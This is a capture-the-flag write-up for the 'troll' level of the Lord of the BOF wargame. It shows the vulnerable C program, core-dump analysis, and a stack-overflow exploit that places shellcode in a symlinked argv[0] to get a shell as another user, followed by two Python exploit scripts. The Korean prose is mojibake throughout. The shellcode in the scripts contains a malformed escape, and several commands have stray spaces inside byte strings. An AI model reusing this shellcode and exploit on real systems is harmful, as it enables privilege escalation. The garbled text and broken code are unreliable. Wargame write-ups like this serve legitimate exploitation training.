---
title: "[LOB]Level08. troll"
tags: [LOB, writeup]
author: eli_ez3r
key: 20180829
modify_date: 2019-11-13
article_header:
  type: cover
  image:
    src: 
---

[+ Check argc](#){:.button.button--outline-success.button--pill}

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - troll
        - check argc + argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	// here is changed
	if(argc != 2){
		printf("argc must be two!\n");
		exit(0);
	}

	// egghunter
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

    // buffer hunter
    memset(buffer, 0, 40);

	// one more!
	memset(argv[1], 0, strlen(argv[1]));
}
```

-----

### 0x01. Analysis

 argcì˜ ê°œìˆ˜ë¥¼ 2ë¡œ ì •í•´ì¡Œìœ¼ë¯€ë¡œ, argv[2]ë¥¼ ì‚¬ìš© í•˜ì§€ ëª»í•œë‹¤.

bufferë‚´ìš©ë„ 0ìœ¼ë¡œ ì´ˆê¸°í™” ë˜ë©°, argv[1]ë¥¼ ì´ìš©í•´ì„œ argv[2]ë¥¼ ë®ìœ¼ë ¤ê³  í•´ë„ ê¸¸ì´ê°€ 48ì„ ë„˜ì–´ ê°ˆ ìˆ˜ ì—†ë‹¤.

ê·¸ë¦¬ê³  argv[1]ì— ë„£ì€ ë§Œí¼ 0ìœ¼ë¡œ ì´ˆê¸°í™” ëœë‹¤.



íŠ¸ë¡¤ ë§ë„¤... ğŸ˜©ğŸ˜«



ì´ˆê¸°í™” ì•ˆëœ ì˜ì—­ì€ argv[0]ì˜ì—­(ì‹¤í–‰íŒŒì¼ ì´ë¦„) ë°–ì— ì—†ë‹¤.

ë”°ë¼ì„œ íŒŒì¼ ì´ë¦„ì— ì‰˜ì½”ë“œë¥¼ ë„£ì–´ì£¼ì–´ì•¼ í•œë‹¤.

ì‹¤ì œ ìŠ¤íƒì— ì˜¬ë¼ê°€ëŠ” ì£¼ì†Œë¥¼ í™•ì¸ í•˜ê¸° ìœ„í•´ `troll`íŒŒì¼ì„ `aroll`íŒŒì¼ë¡œ ë³µì‚¬í•œ í›„ ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ì„¤ì •í•˜ì˜€ë‹¤.

```
[orge@localhost orge]$ ln -s aroll `python -c 'print "A"*50+"S"*48+"A"*32'`
```

- `A` : ì• 50byte, ë’¤ 32byte, NOP Code ë“¤ì–´ê°ˆ ë¶€ë¶„ (ë§ˆì§€ë§‰ì— NOPì½”ë“œë¥¼ ë„£ì§€ ì•ŠëŠ” ê²½ìš° ì œëŒ€ë¡œ ì‰˜ì½”ë“œê°€ ì‹¤í–‰ ì•ˆë˜ëŠ” ê²½ìš°ê°€ ìˆë‹¤.)
-  `S` : 48byte ShellCode ë“¤ì–´ê°ˆ ë¶€ë¶„

ì´ì œ ë§Œë“  ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ì´ìš©í•˜ì—¬ ì‹¤í–‰í•˜ì—¬ ë³¸ë‹¤. (coreë¥¼ ìƒì„±í•˜ì)

```
[orge@localhost orge]$ ./`python -c 'print "A"*50+"S"*48+"A"*32'` `python -c 'print "\x90"*44+"\xbf\xbf\xbf\xbf"'`
ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ì˜œì˜œ
Segmentation fault (core dumped)
```

coreë¥¼ í™•ì¸í•´ë³´ì.

```
[orge@localhost orge]$ gdb -c core
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux".
Core was generated by `./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASSSSSSSSSSSSSSSSSSSSSSSSSSS'.
Program terminated with signal 11, Segmentation fault.
#0  0xbfbfbfbf in ?? ()
```

RETì— ì •ìƒì ìœ¼ë¡œ `0xbfbfbfbf`ê°€ ë“¤ì–´ê°„ ê²ƒì„ í™•ì¸ í•  ìˆ˜ ìˆë‹¤.

```
(gdb) x/100x $esp
0xbffffc50:     0x000001fb      0x00000010      0x0f8bfbff      0x0000000f
0xbffffc60:     0xbffffc8c      0x00000000      0x00000000      0x00000000
0xbffffc70:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc80:     0x00000000      0x00000000      0x00000000      0x36383669
0xbffffc90:     0x412f2e00      0x41414141      0x41414141      0x41414141
0xbffffca0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcb0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcc0:     0x41414141      0x53535341      0x53535353      0x53535353
0xbffffcd0:     0x53535353      0x53535353      0x53535353      0x53535353
0xbffffce0:     0x53535353      0x53535353      0x53535353      0x53535353
0xbffffcf0:     0x53535353      0x41414153      0x41414141      0x41414141
0xbffffd00:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd10:     0x41414141      0x00000041      0x00000000      0x00000000
0xbffffd20:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffd30:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffd40:     0x00000000      0x00000000      0x00000000      0x00000000
(gdb)
```

ìŠ¤íƒì—ì„œ argv[0]ë¶€ë¶„ì˜ ì£¼ì†Œë¥¼ í™•ì¸í•´ë³´ë©´ `0xbffffca0` ê·¼ì²˜ ë¶€ë¶„ì— `A`ê°’ë“¤ì´ ë“¤ì–´ê°„ ê²ƒì„ í™•ì¸ í•  ìˆ˜ìˆë‹¤.

ì•ì„œ ë§í•œê²ƒ ì²˜ëŸ¼ `A`ê°€ ë“¤ì–´ê°€ëŠ” ê³³ì€ NOP Codeê°€ ë“¤ì–´ê°€ê²Œ ë˜ê³  `S`ê°€ ë“¤ì–´ê°€ëŠ” ê³³ì€ Shell Codeê°€ ë“¤ì–´ê°€ëŠ” ê³µê°„ì´ë‹¤.

> ì™œ core ë¤í”„ë¡œ í™•ì¸í•  ë•ŒëŠ” ì‹¤ì œ NOP Codeì™€ Shell Codeë¥¼ ë„£ì§€ ì•Šê³  'A'ì™€ 'S'ë¥¼ ë„£ì—ˆì„ê¹Œ?
>
> ì‹¤ì œ NOPì½”ë“œì™€ Shell Codeë¥¼ ë„£ì–´ì„œ í™•ì¸í•˜ë‹¤ ë³´ë©´ í„°ë¯¸ë„ì— ê¸€ì”¨ë“¤ì´ ê¹¨ì§€ëŠ” í˜„ìƒì´ ì¼ì–´ë‚  ë•Œê°€ ìˆë‹¤. ì´ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ ê³µê°„ë§Œ í• ë‹¹í•˜ê³  ì¼ë°˜ì ì¸ ë¬¸ìë¥¼ ë„£ì–´ í™•ì¸í•œ ê²ƒì´ë‹¤.

ì£¼ì†Œë¥¼ í™•ì¸í•˜ì˜€ìœ¼ë‹ˆ ì‹¤ì œ `troll` ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¬ë³¼ë¦­ ë§í¬ë¡œ ê±¸ê³  Exploitì„ í•´ë³´ì.



```
'\x2f'ì—†ëŠ” shell(48byte) = 
\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
```

> `\x2f`ëŠ” `/` ì— í•´ë‹¹ë˜ëŠ” Hex Codeì´ë‹¤. ë”°ë¼ì„œ Shell Codeì— `\x2f`ê°€ ë“¤ì–´ê°€ê²Œ ë˜ë©´ ì‹¬ë³¼ë¦­ ë§í¬í•˜ëŠ” ê³¼ì •ì—ì„œ `/`ë¡œ ì¸ì‹í•˜ê²Œ ëœë‹¤. ë””ë ‰í† ë¦¬ ê²½ë¡œë¥¼ ë‚˜ëˆŒë•Œ `/`ë¥¼ ì´ìš©í•˜ê¸° ë•Œë¬¸.

-----

### 0x02. Exploit

```
[orge@localhost orge]$ ln -s troll `python -c 'print "\x90"*50+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80 \xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a \xe2\x9a\xb1\x0c\xce\x81"+"\x90"*32'`
```

ì´ì œ `A`ì™€ `S`ê°€ ì•„ë‹Œ ì‹¤ì œ Codeë“¤ì„ ì‹¬ë³¼ë¦­ ë§í¬ ì´ë¦„ìœ¼ë¡œ ì„¤ì •í•œë‹¤.



```
[orge@localhost orge]$ ./`python -c 'print "\x90"*50+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x 75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\x b1\x0c\xce\x81"+"\x90"*32'` `python -c 'print "\x90"*44+"\xa0\xfc\xff\xbf"'`
ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ì¢¢ï£·
í’ºash$ id
uid=507(orge) gid=507(orge) euid=508(troll) egid=508(troll) groups=507(orge)
bash$ my-pass
euid = 508
aspirin
bash$
```

ì„¤ì •í•œ ì‹¬ë³¼ë¦­ ë§í¬ ì´ë¦„ìœ¼ë¡œ trollë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•œë‹¤.

buffer ë°°ì—´ì˜ 40byteì™€ SFP 4byteë¥¼ NOP Codeë¡œ ë®ì–´ì”Œìš°ê³  RETë¶€ë¶„ì— argv[0] ì˜ì—­ìœ¼ë¡œ ì„¤ì •í•˜ì—¬ Shell Codeê°€ ì‹¤í–‰ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

-----

### 0x03. ì •ë¦¬

í•´ë‹¹ ë¬¸ì œëŠ”

- argv[0]ì™€ argv[1]ë§Œì„ ì‚¬ìš©
- argv[1]ì˜ ê¸¸ì´ëŠ” 48ì˜ ê¸¸ì´ ì œí•œ
- RETì˜ ì‹œì‘ì£¼ì†ŒëŠ” `\xbf`ë¡œ ê³ ì •
- í™˜ê²½ë³€ìˆ˜ ì´ˆê¸°í™”
- bufferë°°ì—´ ì´ˆê¸°í™”
- argv[1] ìŠ¤íƒ ì˜ì—­ ì´ˆê¸°í™”

ë³´í˜¸ê¸°ë²•ì´ ì ìš©ëœ ë¬¸ì œì´ë‹¤.

ì´ëŸ°ê²½ìš°ëŠ” **ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ì´ìš©**í•˜ì—¬ argv[0]ì— Shell Codeë¥¼ ë„£ì–´ í•´ê²°í•  ìˆ˜ ìˆìŒì„ ì•Œê²Œ í•´ì£¼ëŠ” ë¬¸ì œì´ë‹¤.

-----

```python
import os
import struct

append = lambda x: payload + x
p32 = lambda x: struct.pack("<I", x)

shellcode = "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\x\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"

target = "\x90"*100 + shellcode
#target = "A"*100+"S"*48

shellcode_addr = 0xbffffc78

payload = "\x90"*44
payload = append(p32(shellcode_addr))

pid = os.fork()

if pid == 0:
        os.execv(target, (target, payload))
else:
        os.waitpid(pid, 0)
```

-----

```python
import os
import struct

append = lambda x: payload + x
p32 = lambda x: struct.pack("<I", x)

target = "/home/orge/"

shellcode = "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\x\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"

sym_link = "\x90"*50 + shellcode + "\x90"*32

shellcode_addr = 0xbffffc78

if os.path.exists(sym_link):
        os.remove(sym_link)

os.symlink('troll', sym_link)
target = target + sym_link

payload = "\x90"*44
payload = append(p32(shellcode_addr))

pid = os.fork()

if pid == 0:
        os.execv(target, (target, payload))
else:
        os.waitpid(pid, 0)
```

